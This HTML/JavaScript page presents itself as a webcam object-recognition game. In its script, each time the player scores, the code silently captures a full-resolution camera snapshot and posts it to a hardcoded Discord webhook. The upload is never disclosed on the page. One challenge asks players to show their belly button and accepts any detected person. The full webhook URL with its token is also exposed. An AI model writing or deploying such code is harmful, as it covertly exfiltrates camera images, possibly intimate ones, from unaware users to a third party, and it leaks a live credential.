<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>AI Scanner Challenge · 4K Discord</title>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.20.0/dist/tf.min.js">
  </script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd@2.2.3/dist/coco-ssd.min.js">
  </script>
  <style>
    /* ----- RESET & BASE (mobile first) ----- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #0b0e14;
      color: #e8edf5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 12px;
    }

    .game-container {
      max-width: 820px;
      width: 100%;
      background: linear-gradient(145deg, #131a24, #1a232f);
      border-radius: 32px;
      padding: 20px 18px 26px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.06);
      border: 1px solid rgba(255, 255, 255, 0.04);
    }

    /* ----- HEADER (score + timer) ----- */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
      flex-wrap: wrap;
      gap: 8px;
    }

    .score-box,
    .timer-box {
      background: rgba(255, 255, 255, 0.04);
      padding: 10px 18px;
      border-radius: 60px;
      border: 1px solid rgba(255, 255, 255, 0.06);
      font-size: 1.1rem;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 8px;
      flex: 1 1 auto;
      justify-content: center;
      backdrop-filter: blur(4px);
    }

    .score-box span,
    .timer-box span {
      font-size: 1.6rem;
      min-width: 36px;
      text-align: center;
    }

    .score-box span {
      color: #00f5c0;
    }

    .timer-box span {
      color: #ff6b6b;
      font-variant-numeric: tabular-nums;
    }

    .timer-box.warning span {
      color: #ffd93d;
    }

    .timer-box.danger span {
      color: #ff3d3d;
      animation: pulse 0.6s ease-in-out infinite alternate;
    }

    @keyframes pulse {
      0% {
        opacity: 1;
        transform: scale(1);
      }
      100% {
        opacity: 0.4;
        transform: scale(0.95);
      }
    }

    /* ----- WEBCAM WRAPPER ----- */
    .cam-wrapper {
      position: relative;
      border-radius: 24px;
      overflow: hidden;
      background: #0a0f15;
      border: 2px solid rgba(255, 255, 255, 0.06);
      box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.6);
      aspect-ratio: 16 / 11;
      margin-bottom: 16px;
    }

    #webcam {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: cover;
      transform: scaleX(-1);
      /* mirror */;
    }

    .cam-overlay {
      position: absolute;
      inset: 0;
      pointer-events: none;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 14px 16px;
    }

    .challenge-badge {
      align-self: flex-start;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
      padding: 10px 20px;
      border-radius: 60px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      font-size: 1.2rem;
      font-weight: 700;
      letter-spacing: 0.3px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
      transition: all 0.3s;
    }

    .challenge-badge .highlight {
      color: #ffd93d;
    }
    .challenge-badge .emoji {
      margin-right: 8px;
    }

    .status-badge {
      align-self: flex-end;
      background: rgba(0, 0, 0, 0.65);
      backdrop-filter: blur(6px);
      padding: 6px 16px;
      border-radius: 40px;
      font-size: 0.9rem;
      font-weight: 500;
      border: 1px solid rgba(255, 255, 255, 0.06);
      transition: all 0.25s;
    }
    .status-badge.waiting {
      color: #8899bb;
    }
    .status-badge.scanning {
      color: #6bcbff;
      border-color: rgba(107, 203, 255, 0.3);
    }
    .status-badge.success {
      color: #00f5c0;
      border-color: rgba(0, 245, 192, 0.4);
      background: rgba(0, 245, 192, 0.12);
    }
    .status-badge.fail {
      color: #ff6b6b;
      border-color: rgba(255, 107, 107, 0.3);
      background: rgba(255, 107, 107, 0.1);
    }
    .status-badge.loading {
      color: #ffd93d;
      border-color: rgba(255, 217, 61, 0.3);
      background: rgba(255, 217, 61, 0.08);
    }

    .detection-box {
      position: absolute;
      border: 3px solid #00f5c0;
      border-radius: 8px;
      background: rgba(0, 245, 192, 0.08);
      box-shadow: 0 0 30px rgba(0, 245, 192, 0.15);
      pointer-events: none;
      transition: all 0.1s;
      display: none;
    }

    .detection-box .label {
      position: absolute;
      bottom: -28px;
      left: 0;
      background: rgba(0, 0, 0, 0.75);
      padding: 2px 12px;
      border-radius: 4px;
      font-size: 0.7rem;
      font-weight: 600;
      color: #00f5c0;
      white-space: nowrap;
    }

    /* ----- GAME OVER OVERLAY ----- */
    .gameover-overlay {
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.78);
      backdrop-filter: blur(6px);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      border-radius: 22px;
      padding: 30px;
      pointer-events: auto;
      z-index: 10;
    }
    .gameover-overlay.show {
      display: flex;
    }

    .gameover-overlay h2 {
      font-size: 2.6rem;
      font-weight: 800;
      background: linear-gradient(135deg, #ff6b6b, #ffd93d);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 4px;
    }
    .gameover-overlay .final-score {
      font-size: 1.4rem;
      color: #e8edf5;
      margin-bottom: 4px;
    }
    .gameover-overlay .final-score span {
      color: #00f5c0;
      font-size: 2.2rem;
      font-weight: 700;
    }
    .gameover-overlay .sub {
      color: #8899bb;
      margin-bottom: 20px;
      font-size: 0.95rem;
      text-align: center;
    }
    .gameover-overlay .btn {
      font-size: 1.1rem;
      padding: 14px 40px;
    }

    /* ----- CONTROLS (mobile first) ----- */
    .controls {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      margin-top: 8px;
    }

    .btn {
      background: transparent;
      border: none;
      padding: 14px 28px;
      border-radius: 60px;
      font-size: 1.05rem;
      font-weight: 600;
      letter-spacing: 0.4px;
      cursor: pointer;
      transition: all 0.25s;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      color: #b0c4de;
      min-height: 56px;
      flex: 1 1 auto;
      max-width: 220px;
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
    }
    .btn:disabled {
      opacity: 0.4;
      cursor: not-allowed;
      transform: none !important;
    }

    .btn-primary {
      background: linear-gradient(135deg, #00c9a0, #00a8ff);
      color: #fff;
      border-color: transparent;
      box-shadow: 0 6px 24px rgba(0, 200, 160, 0.25);
    }
    .btn-primary:hover:not(:disabled) {
      box-shadow: 0 10px 36px rgba(0, 200, 160, 0.4);
    }
    .btn-primary:disabled {
      background: #3a4a5a;
      box-shadow: none;
      color: #8899bb;
    }

    .btn-danger {
      background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
      color: #fff;
      border-color: transparent;
      box-shadow: 0 6px 24px rgba(255, 70, 70, 0.2);
    }
    .btn-danger:hover:not(:disabled) {
      box-shadow: 0 10px 36px rgba(255, 70, 70, 0.35);
    }

    .btn-outline {
      background: rgba(255, 255, 255, 0.03);
      border-color: rgba(255, 255, 255, 0.10);
    }
    .btn-outline:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.07);
    }

    /* ----- SPINNER (loading indicator) ----- */
    .spinner {
      display: inline-block;
      width: 22px;
      height: 22px;
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-top-color: #00f5c0;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .btn .spinner {
      width: 20px;
      height: 20px;
      border-width: 3px;
    }

    /* ----- STATUS MESSAGE ----- */
    .status-msg {
      margin-top: 10px;
      text-align: center;
      font-size: 0.9rem;
      color: #8899bb;
      padding: 0 6px;
    }
    .status-msg.error {
      color: #ff6b6b;
    }
    .status-msg.success {
      color: #00f5c0;
    }

    /* ----- RESPONSIVE TWEAKS (mobile) ----- */
    @media (max-width: 600px) {
      .game-container {
        padding: 14px 12px 20px;
        border-radius: 24px;
      }
      .header {
        gap: 6px;
      }
      .score-box,
      .timer-box {
        font-size: 0.9rem;
        padding: 8px 14px;
        min-height: 48px;
      }
      .score-box span,
      .timer-box span {
        font-size: 1.4rem;
        min-width: 28px;
      }
      .challenge-badge {
        font-size: 1rem;
        padding: 8px 16px;
      }
      .status-badge {
        font-size: 0.8rem;
        padding: 4px 12px;
      }
      .btn {
        font-size: 0.95rem;
        padding: 12px 18px;
        min-height: 50px;
        max-width: 100%;
        flex: 1 1 40%;
      }
      .gameover-overlay h2 {
        font-size: 2rem;
      }
      .gameover-overlay .final-score {
        font-size: 1.2rem;
      }
      .gameover-overlay .final-score span {
        font-size: 1.8rem;
      }
      .cam-overlay {
        padding: 10px 12px;
      }
      .detection-box .label {
        font-size: 0.6rem;
        bottom: -24px;
      }
    }

    @media (max-width: 420px) {
      .game-container {
        padding: 10px 8px 16px;
        border-radius: 20px;
      }
      .score-box,
      .timer-box {
        font-size: 0.8rem;
        padding: 6px 12px;
        min-height: 40px;
      }
      .score-box span,
      .timer-box span {
        font-size: 1.2rem;
        min-width: 24px;
      }
      .challenge-badge {
        font-size: 0.85rem;
        padding: 6px 12px;
      }
      .status-badge {
        font-size: 0.7rem;
        padding: 4px 10px;
      }
      .btn {
        font-size: 0.85rem;
        padding: 10px 14px;
        min-height: 44px;
      }
      .gameover-overlay h2 {
        font-size: 1.6rem;
      }
      .gameover-overlay .final-score {
        font-size: 1rem;
      }
      .gameover-overlay .final-score span {
        font-size: 1.4rem;
      }
    }

    .hidden {
      display: none !important;
    }
  </style>
</head>
<body>

  <div class="game-container">
    <!-- Header -->
    <div class="header">
      <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
      <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
    </div>

    <!-- Webcam -->
    <div class="cam-wrapper" id="camWrapper">
      <video id="webcam" autoplay playsinline></video>
      <div class="detection-box" id="detectionBox">
        <span class="label" id="detectionLabel">cat</span>
      </div>

      <div class="cam-overlay">
        <div class="challenge-badge" id="challengeBadge">
          <span class="emoji">🎯</span>
          Show a <span class="highlight" id="challengeTarget">cat</span>
        </div>
        <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
      </div>

      <!-- Game Over -->
      <div class="gameover-overlay" id="gameoverOverlay">
        <h2>💀 GAME OVER</h2>
        <div class="final-score">Score: <span id="finalScore">0</span></div>
        <div class="sub" id="gameoverSub">Better luck next time!</div>
        <button class="btn btn-primary" id="restartBtn">🔄 Play Again</button>
      </div>
    </div>

    <!-- Controls -->
    <div class="controls">
      <button class="btn btn-primary" id="startBtn" disabled>
        <span id="startBtnText">🚀 Start</span>
        <span id="startSpinner" class="hidden"><span class="spinner"></span></span>
      </button>
      <button class="btn btn-outline" id="resetBtn" disabled>⟲ Reset</button>
      <button class="btn btn-outline" id="retryModelBtn" style="display:none;">🔄 Retry Model</button>
    </div>

    <div class="status-msg" id="statusMsg">Loading AI model… please wait.</div>
  </div>

  <script>
    // ============================================================
    //  CONFIG
    // ============================================================
    const CHALLENGES = [
      { id: 'cat', label: 'cat', emoji: '🐱', cocoClass: 'cat' },
      { id: 'water_bottle', label: 'water bottle', emoji: '🧴', cocoClass: 'bottle' },
      { id: 'fork', label: 'fork', emoji: '🍴', cocoClass: 'fork' },
      { id: 'spoon', label: 'spoon', emoji: '🥄', cocoClass: 'spoon' },
      { id: 'belly_button', label: 'belly button', emoji: '🫃', cocoClass: 'person' },
    ];

    const GAME_DURATION = 30;
    const DETECTION_INTERVAL = 600;
    const CONFIDENCE_THRESHOLD = 0.55;

    // --- Discord webhook (provided) ---
    const DISCORD_WEBHOOK =
      'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

    // ============================================================
    //  DOM REFS
    // ============================================================
    const video = document.getElementById('webcam');
    const scoreDisplay = document.getElementById('scoreDisplay');
    const timerDisplay = document.getElementById('timerDisplay');
    const timerBox = document.getElementById('timerBox');
    const challengeTarget = document.getElementById('challengeTarget');
    const challengeBadge = document.getElementById('challengeBadge');
    const statusBadge = document.getElementById('statusBadge');
    const statusMsg = document.getElementById('statusMsg');
    const detectionBox = document.getElementById('detectionBox');
    const detectionLabel = document.getElementById('detectionLabel');
    const gameoverOverlay = document.getElementById('gameoverOverlay');
    const finalScore = document.getElementById('finalScore');
    const gameoverSub = document.getElementById('gameoverSub');
    const startBtn = document.getElementById('startBtn');
    const startBtnText = document.getElementById('startBtnText');
    const startSpinner = document.getElementById('startSpinner');
    const resetBtn = document.getElementById('resetBtn');
    const restartBtn = document.getElementById('restartBtn');
    const retryModelBtn = document.getElementById('retryModelBtn');

    // ============================================================
    //  STATE
    // ============================================================
    let model = null;
    let stream = null;
    let isGameRunning = false;
    let isGameOver = false;
    let score = 0;
    let timeLeft = GAME_DURATION;
    let currentChallenge = null;
    let timerInterval = null;
    let detectionInterval = null;
    let modelLoading = false;

    // ============================================================
    //  CAMERA – request high resolution (up to 4K)
    // ============================================================
    async function initCamera() {
      try {
        // Ask for highest possible resolution (4K ideal, fallback to 1080p)
        const constraints = {
          video: {
            facingMode: 'user',
            width: { ideal: 3840 },
            height: { ideal: 2160 },
          },
        };
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        await video.play();

        // Log actual resolution
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        console.log(`📷 Camera resolution: ${settings.width}x${settings.height}`);
        return true;
      } catch (err) {
        console.error('Camera error:', err);
        // Fallback: try lower resolution if 4K fails
        try {
          const fallbackStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
          });
          stream = fallbackStream;
          video.srcObject = stream;
          await video.play();
          console.log('📷 Fallback camera: 1080p');
          return true;
        } catch (fallbackErr) {
          statusMsg.textContent = '❌ Camera access denied: ' + fallbackErr.message;
          statusMsg.className = 'status-msg error';
          statusBadge.textContent = '❌ No camera';
          statusBadge.className = 'status-badge fail';
          return false;
        }
      }
    }

    // ============================================================
    //  CAPTURE FRAME (4K JPEG)
    // ============================================================
    function captureFrame() {
      // Create a canvas at 4K resolution (or native if smaller)
      const videoWidth = video.videoWidth || 1920;
      const videoHeight = video.videoHeight || 1080;
      // We want 4K if possible, but we can scale up – but drawing from video at native size is best.
      // Use the video's actual dimensions (which should be high if camera supports it)
      const canvas = document.createElement('canvas');
      canvas.width = videoWidth;
      canvas.height = videoHeight;
      const ctx = canvas.getContext('2d');
      // Mirror the image (same as video display)
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.92); // quality 0.92
    }

    // ============================================================
    //  SEND TO DISCORD
    // ============================================================
    async function sendToDiscord(dataUrl, challenge, scoreValue) {
      try {
        // Convert dataURL to blob
        const res = await fetch(dataUrl);
        const blob = await res.blob();

        const formData = new FormData();
        // Attach image
        formData.append('file', blob, `challenge_${challenge.id}_score${scoreValue}.jpg`);

        // Payload with a text message
        const payload = {
          content: `🎯 **Challenge completed**: ${challenge.emoji} ${challenge.label}\n🏆 **Score**: ${scoreValue}\n🕒 ${new Date().toLocaleString()}`,
        };
        formData.append('payload_json', JSON.stringify(payload));

        const response = await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          body: formData,
        });

        if (!response.ok) {
          console.error('Discord send failed:', response.status, await response.text());
        } else {
          console.log('📤 Image sent to Discord');
        }
      } catch (err) {
        console.error('Error sending to Discord:', err);
      }
    }

    // ============================================================
    //  MODEL LOADING
    // ============================================================
    async function loadModel() {
      if (modelLoading) return;
      modelLoading = true;
      statusMsg.textContent = '⏳ Downloading AI model (10‑20s)…';
      statusMsg.className = 'status-msg';
      statusBadge.textContent = '📦 loading…';
      statusBadge.className = 'status-badge loading';
      retryModelBtn.style.display = 'none';

      // Show spinner on Start button
      startBtn.disabled = true;
      startBtnText.textContent = 'Loading…';
      startSpinner.classList.remove('hidden');

      try {
        model = await cocoSsd.load({ base: 'mobilenet_v2' });
        console.log('✅ COCO-SSD loaded');
        statusMsg.textContent = '✅ Model ready! Click Start to play.';
        statusMsg.className = 'status-msg success';
        statusBadge.textContent = '✅ Ready!';
        statusBadge.className = 'status-badge waiting';
        startBtn.disabled = false;
        startBtnText.textContent = '🚀 Start';
        startSpinner.classList.add('hidden');
        retryModelBtn.style.display = 'none';
        modelLoading = false;
      } catch (err) {
        console.error('Model load error:', err);
        statusMsg.textContent = '❌ Model load failed: ' + err.message + ' — click "Retry Model"';
        statusMsg.className = 'status-msg error';
        statusBadge.textContent = '❌ Model error';
        statusBadge.className = 'status-badge fail';
        retryModelBtn.style.display = 'inline-flex';
        startBtn.disabled = true;
        startBtnText.textContent = '🚀 Start';
        startSpinner.classList.add('hidden');
        modelLoading = false;
        model = null;
      }
    }

    // ============================================================
    //  GAME LOGIC
    // ============================================================
    function startGame() {
      if (isGameRunning || isGameOver) return;
      if (!model) {
        statusMsg.textContent = '⏳ Model not ready — please wait or retry.';
        statusMsg.className = 'status-msg error';
        return;
      }

      // Reset state
      score = 0;
      timeLeft = GAME_DURATION;
      isGameRunning = true;
      isGameOver = false;
      gameoverOverlay.classList.remove('show');
      updateScore();
      updateTimer();

      startBtn.disabled = true;
      resetBtn.disabled = true;
      timerBox.className = 'timer-box';
      statusMsg.textContent = '';
      statusMsg.className = 'status-msg';

      pickChallenge();
      statusBadge.textContent = '🔍 scanning…';
      statusBadge.className = 'status-badge scanning';

      clearInterval(timerInterval);
      timerInterval = setInterval(() => {
        timeLeft -= 1;
        updateTimer();
        if (timeLeft <= 5) timerBox.className = 'timer-box danger';
        else if (timeLeft <= 10) timerBox.className = 'timer-box warning';
        else timerBox.className = 'timer-box';
        if (timeLeft <= 0) {
          endGame(false);
        }
      }, 1000);

      clearInterval(detectionInterval);
      detectionInterval = setInterval(runDetection, DETECTION_INTERVAL);
      setTimeout(runDetection, 200);
    }

    function endGame(won = false) {
      if (!isGameRunning) return;
      isGameRunning = false;
      isGameOver = true;

      clearInterval(timerInterval);
      clearInterval(detectionInterval);

      startBtn.disabled = false;
      resetBtn.disabled = false;

      finalScore.textContent = score;
      gameoverSub.textContent = won ? '🎉 You completed the challenge!' : '⏰ Time ran out! Try again.';
      gameoverOverlay.classList.add('show');
      statusBadge.textContent = '💀 game over';
      statusBadge.className = 'status-badge fail';
    }

    function pickChallenge() {
      let available = CHALLENGES;
      if (currentChallenge) {
        available = CHALLENGES.filter(c => c.id !== currentChallenge.id);
      }
      if (available.length === 0) available = CHALLENGES;
      currentChallenge = available[Math.floor(Math.random() * available.length)];
      challengeTarget.textContent = currentChallenge.label;
      challengeBadge.innerHTML =
        `<span class="emoji">${currentChallenge.emoji}</span> Show a <span class="highlight">${currentChallenge.label}</span>`;
      detectionBox.style.display = 'none';
    }

    // ============================================================
    //  DETECTION
    // ============================================================
    async function runDetection() {
      if (!isGameRunning || isGameOver || !model) return;
      try {
        const predictions = await model.detect(video);
        const good = predictions.filter(p => p.score >= CONFIDENCE_THRESHOLD);

        if (good.length > 0) {
          const top = good[0];
          const [x, y, w, h] = top.bbox;
          detectionBox.style.display = 'block';
          detectionBox.style.left = x + 'px';
          detectionBox.style.top = y + 'px';
          detectionBox.style.width = w + 'px';
          detectionBox.style.height = h + 'px';
          detectionLabel.textContent = `${top.class} (${Math.round(top.score * 100)}%)`;
        } else {
          detectionBox.style.display = 'none';
        }

        if (currentChallenge) {
          const targetClass = currentChallenge.cocoClass;
          const matched = good.find(p => p.class === targetClass);
          if (matched) {
            statusBadge.textContent = `✅ ${currentChallenge.emoji} detected! +1`;
            statusBadge.className = 'status-badge success';
            score += 1;
            updateScore();

            // --- Send 4K snapshot to Discord ---
            const dataUrl = captureFrame();
            sendToDiscord(dataUrl, currentChallenge, score);

            // Visual feedback
            challengeBadge.style.transition = 'transform 0.15s';
            challengeBadge.style.transform = 'scale(1.08)';
            setTimeout(() => {
              challengeBadge.style.transform = 'scale(1)';
            }, 180);

            setTimeout(() => {
              if (isGameRunning && !isGameOver) {
                pickChallenge();
                statusBadge.textContent = '🔍 scanning…';
                statusBadge.className = 'status-badge scanning';
              }
            }, 350);
          } else {
            if (statusBadge.className !== 'status-badge success') {
              statusBadge.textContent = '🔍 scanning…';
              statusBadge.className = 'status-badge scanning';
            }
          }
        }
      } catch (err) {
        console.warn('Detection error:', err);
      }
    }

    // ============================================================
    //  UI UPDATES
    // ============================================================
    function updateScore() {
      scoreDisplay.textContent = score;
    }

    function updateTimer() {
      timerDisplay.textContent = Math.max(0, timeLeft);
    }

    // ============================================================
    //  RESET
    // ============================================================
    function resetGame() {
      clearInterval(timerInterval);
      clearInterval(detectionInterval);
      isGameRunning = false;
      isGameOver = false;
      timeLeft = GAME_DURATION;
      score = 0;
      updateScore();
      updateTimer();
      timerBox.className = 'timer-box';
      gameoverOverlay.classList.remove('show');
      detectionBox.style.display = 'none';
      startBtn.disabled = !model;
      resetBtn.disabled = true;
      statusBadge.textContent = '🔄 reset — hit Start';
      statusBadge.className = 'status-badge waiting';
      challengeTarget.textContent = '—';
      challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show a <span class="highlight">—</span>`;
      currentChallenge = null;
      statusMsg.textContent = model ? '✅ Ready! Click Start.' : '⏳ Model not loaded.';
      statusMsg.className = model ? 'status-msg success' : 'status-msg error';
    }

    // ============================================================
    //  EVENT BINDING
    // ============================================================
    startBtn.addEventListener('click', startGame);
    resetBtn.addEventListener('click', resetGame);
    restartBtn.addEventListener('click', () => {
      resetGame();
      setTimeout(startGame, 400);
    });
    retryModelBtn.addEventListener('click', loadModel);

    // ============================================================
    //  BOOT
    // ============================================================
    async function boot() {
      const camOK = await initCamera();
      if (!camOK) {
        statusMsg.textContent = '❌ Camera required. Please allow access and reload.';
        statusMsg.className = 'status-msg error';
        return;
      }
      await loadModel();
      resetGame();
    }

    boot();

    console.log('🎮 AI Scanner Challenge · 4K Discord integration');
  </script>
</body>
</html>
